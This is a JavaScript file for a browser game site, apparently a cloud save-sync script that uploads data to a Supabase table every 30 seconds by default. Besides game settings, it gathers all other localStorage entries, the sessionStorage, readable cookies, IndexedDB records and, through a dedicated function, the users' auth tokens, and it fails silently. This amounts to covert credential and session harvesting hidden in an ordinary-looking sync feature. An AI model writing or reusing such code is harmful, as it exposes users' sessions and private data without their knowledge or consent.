(function () {
  var CLOUD_AUTO_SYNC_KEY = "gamehub_cloud_auto_sync";
  var CLOUD_LAST_SYNC_KEY = "gamehub_cloud_last_sync";
  var SUPABASE_CONFIG_KEY = "gamehub_supabase_config";
  var FAVORITES_KEY = "gamehub_favorites";
  var RECENTS_KEY = "gamehub_recent";
  var THEME_KEY = "gamehub_theme";
  var FAST_MODE_KEY = "gamehub_fast_mode";
  var PERFORMANCE_PROFILE_KEY = "gamehub_performance_profile";
  var LIBRARY_VIEW_KEY = "gamehub_library_view";
  var OPEN_SOURCE_ONLY_KEY = "gamehub_open_source_only";
  var PLAYABLE_ONLY_KEY = "gamehub_playable_only";
  var GAME_SAVES_KEY = "gamehub_game_saves";

  var SAVE_KEYS = [
    FAVORITES_KEY,
    RECENTS_KEY,
    THEME_KEY,
    FAST_MODE_KEY,
    PERFORMANCE_PROFILE_KEY,
    LIBRARY_VIEW_KEY,
    OPEN_SOURCE_ONLY_KEY,
    PLAYABLE_ONLY_KEY,
    CLOUD_AUTO_SYNC_KEY,
    GAME_SAVES_KEY,
    "gamehub_local_last_saved",
    CLOUD_LAST_SYNC_KEY
  ];

  var INDEXED_DB_SYNC_MAX_DATABASES = 6;
  var INDEXED_DB_SYNC_MAX_STORES_PER_DB = 12;
  var INDEXED_DB_SYNC_MAX_RECORDS_PER_STORE = 200;
  var INDEXED_DB_SYNC_MAX_VALUE_CHARS = 120000;
  var AUTOSYNC_INTERVAL_MS = 30000;

  var inFlight = false;
  var timer = null;
  var client = null;

  function storageGet(key) {
    try {
      return localStorage.getItem(key);
    } catch (error) {
      return null;
    }
  }

  function storageSet(key, value) {
    try {
      localStorage.setItem(key, value);
    } catch (error) {
    }
  }

  function readArray(key) {
    try {
      var value = JSON.parse(storageGet(key));
      return Array.isArray(value) ? value : [];
    } catch (error) {
      return [];
    }
  }

  function readObject(key) {
    try {
      var value = JSON.parse(storageGet(key) || "{}");
      if (!value || typeof value !== "object" || Array.isArray(value)) {
        return {};
      }
      return value;
    } catch (error) {
      return {};
    }
  }

  function readSetting(key, fallback) {
    var value = storageGet(key);
    return value === null ? fallback : value;
  }

  function toJsonSafeValue(value, maxChars) {
    try {
      var json = JSON.stringify(value);
      if (typeof json !== "string" || json.length > maxChars) {
        return null;
      }
      return JSON.parse(json);
    } catch (error) {
      return null;
    }
  }

  function shouldSyncExtraLocalStorageKey(key) {
    if (typeof key !== "string" || !key) {
      return false;
    }
    if (SAVE_KEYS.indexOf(key) !== -1 || key === SUPABASE_CONFIG_KEY) {
      return false;
    }
    if (/^sb-.*-auth-token$/i.test(key) || key === "supabase.auth.token") {
      return false;
    }
    return true;
  }

  function snapshotExtraLocalStorage() {
    var out = {};
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (!shouldSyncExtraLocalStorageKey(key)) {
          continue;
        }
        var value = localStorage.getItem(key);
        if (typeof value === "string") {
          out[key] = value;
        }
      }
    } catch (error) {
      return out;
    }
    return out;
  }

  function isAuthTokenStorageKey(key) {
    return /^sb-.*-auth-token$/i.test(key) || key === "supabase.auth.token";
  }

  function snapshotAuthTokens() {
    var out = {};
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        if (!isAuthTokenStorageKey(key)) {
          continue;
        }
        var value = localStorage.getItem(key);
        if (typeof value === "string" && value) {
          out[key] = value;
        }
      }
    } catch (error) {
      return out;
    }
    return out;
  }

  function snapshotSessionStorage() {
    var out = {};
    try {
      if (!window.sessionStorage) {
        return out;
      }
      for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        var value = sessionStorage.getItem(key);
        if (typeof key === "string" && key && typeof value === "string") {
          out[key] = value;
        }
      }
    } catch (error) {
      return out;
    }
    return out;
  }

  function snapshotCookies() {
    var out = {};
    try {
      var raw = document.cookie || "";
      if (!raw) {
        return out;
      }
      raw.split(";").forEach(function (part) {
        var section = part.trim();
        if (!section) {
          return;
        }
        var eqIndex = section.indexOf("=");
        if (eqIndex <= 0) {
          return;
        }
        var key = section.slice(0, eqIndex).trim();
        var value = section.slice(eqIndex + 1);
        if (key) {
          out[key] = value;
        }
      });
    } catch (error) {
      return out;
    }
    return out;
  }

  function shouldSyncIndexedDbName(name) {
    if (typeof name !== "string" || !name) {
      return false;
    }
    if (/supabase|firebase|auth|workbox|service ?worker|cache/i.test(name)) {
      return false;
    }
    return true;
  }

  function getIndexedDbDatabaseList() {
    try {
      if (!window.indexedDB || typeof window.indexedDB.databases !== "function") {
        return Promise.resolve([]);
      }
      return window.indexedDB.databases().then(function (list) {
        return Array.isArray(list) ? list : [];
      }).catch(function () {
        return [];
      });
    } catch (error) {
      return Promise.resolve([]);
    }
  }

  function openIndexedDb(name, version) {
    return new Promise(function (resolve, reject) {
      var request;
      try {
        request = (typeof version === "number" && version > 0)
          ? window.indexedDB.open(name, version)
          : window.indexedDB.open(name);
      } catch (error) {
        reject(error);
        return;
      }

      request.onsuccess = function () {
        resolve(request.result);
      };
      request.onerror = function () {
        reject(request.error || new Error("Unable to open IndexedDB"));
      };
    });
  }

  function readIndexedDbStoreSnapshot(db, storeName) {
    return new Promise(function (resolve, reject) {
      var tx;
      try {
        tx = db.transaction(storeName, "readonly");
      } catch (error) {
        resolve(null);
        return;
      }

      var store = tx.objectStore(storeName);
      var out = {
        keyPath: typeof store.keyPath === "string" ? store.keyPath : null,
        autoIncrement: store.autoIncrement === true,
        records: []
      };

      var cursorRequest = store.openCursor();
      cursorRequest.onsuccess = function () {
        var cursor = cursorRequest.result;
        if (!cursor) {
          resolve(out);
          return;
        }

        if (out.records.length >= INDEXED_DB_SYNC_MAX_RECORDS_PER_STORE) {
          resolve(out);
          return;
        }

        var safeValue = toJsonSafeValue(cursor.value, INDEXED_DB_SYNC_MAX_VALUE_CHARS);
        var safeKey = toJsonSafeValue(cursor.key, 4000);
        if (safeValue !== null && safeKey !== null) {
          out.records.push({ key: safeKey, value: safeValue });
        }
        cursor.continue();
      };
      cursorRequest.onerror = function () {
        reject(cursorRequest.error || new Error("Unable to read IndexedDB store"));
      };
    });
  }

  async function snapshotIndexedDb() {
    if (!window.indexedDB) {
      return {};
    }

    var out = {};
    var dbList = await getIndexedDbDatabaseList();
    var names = dbList
      .map(function (db) { return db && typeof db.name === "string" ? db.name : ""; })
      .filter(function (name) { return shouldSyncIndexedDbName(name); })
      .slice(0, INDEXED_DB_SYNC_MAX_DATABASES);

    for (var i = 0; i < names.length; i++) {
      var name = names[i];
      var info = dbList.find(function (db) { return db && db.name === name; }) || {};
      var version = typeof info.version === "number" && info.version > 0 ? Math.floor(info.version) : 1;
      var db = null;
      try {
        db = await openIndexedDb(name, version);
        var storeNames = Array.from(db.objectStoreNames || []).slice(0, INDEXED_DB_SYNC_MAX_STORES_PER_DB);
        var stores = {};
        for (var s = 0; s < storeNames.length; s++) {
          var storeName = storeNames[s];
          var storeSnapshot = await readIndexedDbStoreSnapshot(db, storeName);
          if (storeSnapshot) {
            stores[storeName] = storeSnapshot;
          }
        }
        if (Object.keys(stores).length > 0) {
          out[name] = { version: version, stores: stores };
        }
      } catch (error) {
      } finally {
        if (db) {
          db.close();
        }
      }
    }

    return out;
  }

  function getSupabaseConfig() {
    var cfg = window.__GAMEHUB_SUPABASE__ || {};
    var localCfg = {};
    try {
      localCfg = JSON.parse(storageGet(SUPABASE_CONFIG_KEY) || "{}") || {};
    } catch (error) {
      localCfg = {};
    }

    var localUrl = typeof localCfg.url === "string" ? localCfg.url.trim() : "";
    var localAnon = typeof localCfg.anonKey === "string" ? localCfg.anonKey.trim() : "";
    var fileUrl = typeof cfg.url === "string" ? cfg.url.trim() : "";
    var fileAnon = typeof cfg.anonKey === "string" ? cfg.anonKey.trim() : "";

    return {
      url: localUrl || fileUrl,
      anonKey: localAnon || fileAnon
    };
  }

  async function getSupabaseClient() {
    if (client) {
      return client;
    }
    if (!(window.supabase && typeof window.supabase.createClient === "function")) {
      return null;
    }
    var cfg = getSupabaseConfig();
    if (!cfg.url || !cfg.anonKey) {
      return null;
    }
    client = window.supabase.createClient(cfg.url, cfg.anonKey);
    return client;
  }

  async function buildPayload() {
    return {
      version: 1,
      exportedAt: new Date().toISOString(),
      data: {
        favorites: readArray(FAVORITES_KEY),
        recent: readArray(RECENTS_KEY),
        theme: readSetting(THEME_KEY, "light"),
        fastMode: readSetting(FAST_MODE_KEY, "0"),
        performanceProfile: readSetting(PERFORMANCE_PROFILE_KEY, "normal"),
        libraryView: readSetting(LIBRARY_VIEW_KEY, "cards"),
        openSourceOnly: readSetting(OPEN_SOURCE_ONLY_KEY, "0"),
        playableOnly: readSetting(PLAYABLE_ONLY_KEY, "0"),
        cloudAutoSync: readSetting(CLOUD_AUTO_SYNC_KEY, "1"),
        gameSaves: readObject(GAME_SAVES_KEY),
        extraLocalStorage: snapshotExtraLocalStorage(),
        authTokens: snapshotAuthTokens(),
        sessionStorage: snapshotSessionStorage(),
        cookies: snapshotCookies(),
        indexedDb: await snapshotIndexedDb()
      }
    };
  }

  async function runCloudSync() {
    if (inFlight) {
      return;
    }
    if (readSetting(CLOUD_AUTO_SYNC_KEY, "1") !== "1") {
      return;
    }

    var supabaseClient = await getSupabaseClient();
    if (!supabaseClient) {
      return;
    }

    inFlight = true;
    try {
      var auth = await supabaseClient.auth.getUser();
      var user = auth && auth.data ? auth.data.user : null;
      if (!user) {
        return;
      }

      var payload = await buildPayload();
      var result = await supabaseClient
        .from("user_saves")
        .upsert({ user_id: user.id, payload: payload }, { onConflict: "user_id" });

      if (result && result.error) {
        throw result.error;
      }

      storageSet(CLOUD_LAST_SYNC_KEY, new Date().toISOString());
    } catch (error) {
    } finally {
      inFlight = false;
    }
  }

  function start() {
    if (timer) {
      clearInterval(timer);
    }

    runCloudSync();
    timer = setInterval(runCloudSync, AUTOSYNC_INTERVAL_MS);

    window.addEventListener("pagehide", runCloudSync);
    window.addEventListener("beforeunload", runCloudSync);
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState === "hidden") {
        runCloudSync();
      }
    });
  }

  start();
})();
